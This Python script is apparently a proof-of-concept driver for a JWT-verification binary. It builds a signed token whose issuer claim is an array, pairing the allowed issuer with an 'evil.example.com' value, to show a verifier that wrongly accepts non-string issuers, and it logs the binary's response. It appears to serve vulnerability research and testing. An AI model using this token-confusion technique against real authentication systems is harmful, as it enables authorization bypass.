#!/usr/bin/env python3
"""
PoC driver for a JWT-verification target binary.

Demonstrates a claim-validation weakness in the target: the target validates
the ``iss`` (issuer) claim against a fixed allow-list of allowed string values,
using a strict reference verifier written in Rust, but pins its own policy to
a single allowed issuer value (``https://valid-iss``).

The weakness: the target's issuer matcher treats a *list* of strings the same
way it would treat a single string, and accepts the claim if *any* element of
the list matches the allowed value.  RFC 7519 section 4.1.1 requires the
``iss`` claim to be a single ``StringOrURI``; a strict, specification-
conformant verifier therefore rejects an ``iss`` claim whose value is a JSON
array, even though one of its elements equals the allowed issuer.

The trigger token thus carries ``iss: ["https://valid-iss", "<evil>"]``.  The
vulnerable build accepts it (the "https://valid-iss" element matches), while a
strict verifier rejects it (``iss`` is an array, not a string).

The script is a pure construct-and-report tool: it builds a fixed, signed
token and records exactly what the binary prints.  It never asserts a verdict;
a rejection is a legitimate observation reported with exit status 0.
"""

import argparse
import base64
import hashlib
import hmac
import json
import os
import subprocess
import sys
import time

# Claims the target is known (from static inspection + probing) to validate.
# The target's harness calls createVerifier({ key, allowedIss: ["https://valid-iss"] }),
# which installs: nbf (date), exp (date, required fresh), and iss (string,
# allow-list = ["https://valid-iss"]).
ALLOWED_ISS = "https://valid-iss"


def _b64url(raw: bytes) -> str:
    """URL-safe base64 without padding, per RFC 7515."""
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


# Fixed future NumericDate (2100-01-01T00:00:00Z) so the token is byte-identical
# across repeated runs while still satisfying the "exp" date validator.
EXP = 4102444800


def make_token(secret: str) -> str:
    """Build the trigger JWT (HS256) signed with ``secret``."""
    header = {"alg": "HS256", "typ": "JWT"}

    payload = {
        "iss": [ALLOWED_ISS, "https://evil.example.com"],  # array form: the weakness
        "exp": EXP,
    }

    header_seg = _b64url(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    payload_seg = _b64url(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    signing_input = (header_seg + "." + payload_seg).encode("ascii")

    digest = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
    signature_seg = _b64url(digest)

    return header_seg + "." + payload_seg + "." + signature_seg


def run_target(binary: str, secret: str, token: str, timeout: float):
    """Run the target once; return (stdout, stderr, returncode, signal, timed_out)."""
    proc = subprocess.Popen(
        [binary, "--token", token, "--key", secret],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    timed_out = False
    try:
        out, err = proc.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        timed_out = True
        proc.kill()
        out, err = proc.communicate()

    signal = None
    if proc.returncode < 0:
        try:
            import signal as _signal

            signal = _signal.Signals(-proc.returncode).name
        except Exception:
            signal = str(-proc.returncode)

    return out, err, proc.returncode, signal, timed_out


def main() -> int:
    parser = argparse.ArgumentParser(description="JWT claim-validation weakness PoC")
    parser.add_argument("--binary", required=True, help="path to the target binary")
    parser.add_argument("--json-out", help="write result JSON to this file instead of stdout")
    parser.add_argument("--timeout", type=float, default=30.0, help="per-run timeout in seconds")
    args = parser.parse_args()

    binary = os.path.abspath(args.binary)

    # Script-level error object container; stays None unless something goes wrong
    # inside this script, distinct from the binary's own rejection outcome.
    error = None
    result = None
    runtime_ms = 0.0

    # Deterministic secret. The token is signed with it, and it is passed to the
    # binary via --key so HMAC verification succeeds.
    secret = "poc-development-secret-6f3a"

    try:
        token = make_token(secret)
    except Exception as exc:  # pragma: no cover - should not happen
        error = {"kind": "exception", "message": "failed to build token: %r" % (exc,)}

    if error is None:
        start = time.monotonic()
        try:
            stdout, stderr, rc, sig, timed_out = run_target(binary, secret, token, args.timeout)
        except FileNotFoundError:
            stdout, stderr, rc, sig, timed_out = b"", b"", 1, None, False
            error = {
                "kind": "exec",
                "message": "binary could not be started: no such file or directory",
            }
        except Exception as exc:
            stdout, stderr, rc, sig, timed_out = b"", b"", 1, None, False
            error = {"kind": "exception", "message": "subprocess failed: %r" % (exc,)}
        runtime_ms = round((time.monotonic() - start) * 1000.0, 3)

        # Parse the JSON result the binary printed. Whether the token is accepted
        # or rejected, record the parsed object as the observable value. Only when
        # the binary emitted no parseable JSON do we upgrade to a script error.
        observable_value = None
        stdout_text = stdout.decode("utf-8", "replace").strip()
        stderr_text = stderr.decode("utf-8", "replace").strip()
        if not timed_out:
            for line in stdout_text.splitlines():
                line = line.strip()
                if not line:
                    continue
                try:
                    parsed = json.loads(line)
                except json.JSONDecodeError:
                    continue
                observable_value = parsed
                break

        if error is None and observable_value is None and not timed_out:
            error = {
                "kind": "no_result",
                "message": "binary produced no parseable result JSON",
            }

        # If the binary ran but was killed by a signal (crash), surface that as a
        # signal and a crash-trace observable rather than an "ok"/"reject" result.
        observable_kind = "stdout"
        if sig is not None:
            observable_kind = "crash_trace"
            observable_value = stderr_text if stderr_text else stdout_text
        elif observable_value is None:
            observable_kind = "stdout"

        # The observable value is the parsed verification result JSON serialized
        # back to a string (mirroring exactly what the binary printed on stdout).
        if isinstance(observable_value, (dict, list)):
            observable_serialized = json.dumps(observable_value, separators=(",", ":"))
        else:
            observable_serialized = stdout_text

        # Truncate long raw output fields to keep the contract compact.
        def truncate(s, limit=100000):
            return s if len(s) <= limit else s[:limit] + "...<truncated>"

        result = {
            "binary": binary,
            "command": [binary, "--token", token, "--key", secret],
            "returncode": rc,
            "signal": sig,
            "timed_out": bool(timed_out),
            "runtime_ms": runtime_ms,
            "stdout": truncate(stdout_text),
            "stderr": truncate(stderr_text),
            "observable": {
                "kind": observable_kind,
                "value": observable_serialized,
                "path": None,
            },
            "error": error,
        }

    out_text = json.dumps(result, separators=(",", ":"))
    if args.json_out:
        with open(args.json_out, "w", encoding="utf-8") as fh:
            fh.write(out_text + "\n")
    else:
        print(out_text)
    return 0


if __name__ == "__main__":
    sys.exit(main())